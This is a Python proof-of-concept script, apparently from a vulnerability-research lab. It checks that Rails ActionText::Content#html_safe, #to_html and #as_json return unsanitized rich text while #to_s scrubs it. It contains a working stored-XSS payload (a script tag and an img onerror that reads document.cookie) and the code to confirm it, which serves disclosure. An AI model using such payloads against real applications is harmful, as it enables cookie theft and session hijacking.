#!/usr/bin/env python3
"""
VULN-008 — ActionText::Content#html_safe / #to_html / #as_json return UNSANITIZED rich text

Vulnerable code (targets/rails/):
  * actiontext/lib/action_text/content.rb:30     delegate :blank?, :empty?, :html_safe, :present?, to: :to_html
  * actiontext/lib/action_text/content.rb:168-170 to_html => fragment.to_html (NOT scrubbed)
  * actiontext/lib/action_text/content.rb:191-193 as_json => to_html (raw)
  * (safe path) content.rb:187-189 to_s => to_rendered_html_with_layout => sanitize_action_text_content

Vulnerability class: CWE-79 stored XSS on misuse via a misleading "safe"-named API.

Flaw in plain English:
  Action Text sanitizes on RENDER: `<%= content %>` goes through `to_s`, which scrubs. But a method
  literally named `html_safe` is delegated to `to_html`, which returns the RAW stored markup wrapped in
  an ActiveSupport::SafeBuffer (flagged html-safe) — the opposite of the contract the name advertises.
  `to_html` and `as_json` likewise return the raw markup. An app that renders stored rich text via
  `content.html_safe` / `raw(content)` / JSON-serialized-then-injected emits the attacker's
  <script>/<img onerror> verbatim.

What a successful run proves (on the real framework via bin/rails runner):
  given a rich-text value containing <script> and <img ... onerror=...>,
  * to_s SCRUBS both (the idiomatic/safe path), but
  * html_safe, to_html and as_json all RETURN THEM VERBATIM, and html_safe returns an html_safe? buffer
    (so it is emitted without escaping) — i.e. the "safe"-named method yields XSS-capable markup.
"""
import os
import re
import sys

import railslab as R
from railslab import log

HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")
os.makedirs(EVID, exist_ok=True)

PAYLOAD = "<p>hi</p><img src=x onerror=alert(document.cookie)><script>alert(1)</script>"


def main() -> int:
    R.banner("VULN-008", "ActionText::Content#html_safe/#to_html/#as_json return unsanitized markup",
             "ActionText::Content#to_html (raw fragment) vs #to_s (sanitize-on-render)")
    if not R.require_up():
        log("FAIL", f"target {R.BASE_URL} not answering /up"); return 1

    log("SETUP", f"rich-text payload under test: {PAYLOAD}")
    ruby = f'''
$stdout.sync = true
html = {PAYLOAD!r}
c = ActionText::Content.new(html)
to_s      = c.to_s                      # idiomatic <%= content %> path
html_safe = c.html_safe                 # the footgun
to_html   = c.to_html
as_json   = c.as_json
puts "@@to_s script=#{{to_s.include?('<script>')}} onerror=#{{to_s.include?('onerror')}}"
puts "@@html_safe script=#{{html_safe.include?('<script>')}} onerror=#{{html_safe.include?('onerror')}} is_html_safe=#{{html_safe.html_safe?}}"
puts "@@to_html script=#{{to_html.include?('<script>')}} onerror=#{{to_html.include?('onerror')}}"
puts "@@as_json script=#{{as_json.to_s.include?('<script>')}} onerror=#{{as_json.to_s.include?('onerror')}}"
puts "@@sample to_s=#{{to_s.inspect}}"
puts "@@sample html_safe=#{{html_safe.inspect}}"
puts "@@done"
'''
    with open(os.path.join(EVID, "runner.rb"), "w") as f:
        f.write(ruby)

    log("STEP", "comparing to_s (render path) vs html_safe/to_html/as_json on the real ActionText::Content")
    rc, out, err = R.run_ruby(ruby)
    markers = [l for l in out.splitlines() if l.startswith("@@")]
    for m in markers:
        log("INFO", m)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("\n".join(markers) + "\n")
        if err.strip():
            f.write("\n[stderr tail]\n" + err[-500:])
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# Not HTTP — framework-library finding. Exercised via:\n")
        f.write("#   docker exec -i cvehunterlab_rails_app bash -lc 'cd /harness && RAILS_ENV=production bin/rails runner -' < evidence/runner.rb\n")

    def g(prefix, key):
        for mk in markers:
            if mk.startswith(prefix):
                mm = re.search(rf"\b{key}=(\S+)", mk)
                return mm.group(1) if mm else None
        return None

    to_s_clean = g("@@to_s", "script") == "false" and g("@@to_s", "onerror") == "false"
    hs_raw = g("@@html_safe", "script") == "true" and g("@@html_safe", "onerror") == "true"
    hs_flag = g("@@html_safe", "is_html_safe") == "true"
    tohtml_raw = g("@@to_html", "script") == "true"
    asjson_raw = g("@@as_json", "script") == "true"

    if to_s_clean:
        log("PROOF", "to_s (the <%= content %> path) SCRUBBED both <script> and onerror — the idiomatic path is safe")
    if hs_raw and hs_flag:
        log("PROOF", "html_safe returned the <script> and onerror VERBATIM, flagged html_safe? = true — "
                     "the 'safe'-named method emits XSS-capable markup without escaping")
    if tohtml_raw and asjson_raw:
        log("PROOF", "to_html and as_json also return the raw, unsanitized markup (extends the trap to JSON APIs)")

    if to_s_clean and hs_raw and hs_flag and tohtml_raw and asjson_raw:
        log("OK", "exploit confirmed — ActionText::Content#html_safe/#to_html/#as_json return unsanitized rich text "
                  "while #to_s sanitizes; rendering stored content via the footgun path yields stored XSS")
        R.verdict("VULN-008", "CONFIRMED",
                  "html_safe/to_html/as_json return unsanitized rich text (stored XSS when an app renders via that path)")
        return 0
    log("FAIL", f"did not confirm: to_s_clean={to_s_clean} hs_raw={hs_raw} hs_flag={hs_flag} tohtml={tohtml_raw} asjson={asjson_raw}")
    R.verdict("VULN-008", "FAILED", "sanitize asymmetry not reproduced")
    return 1


if __name__ == "__main__":
    sys.exit(main())
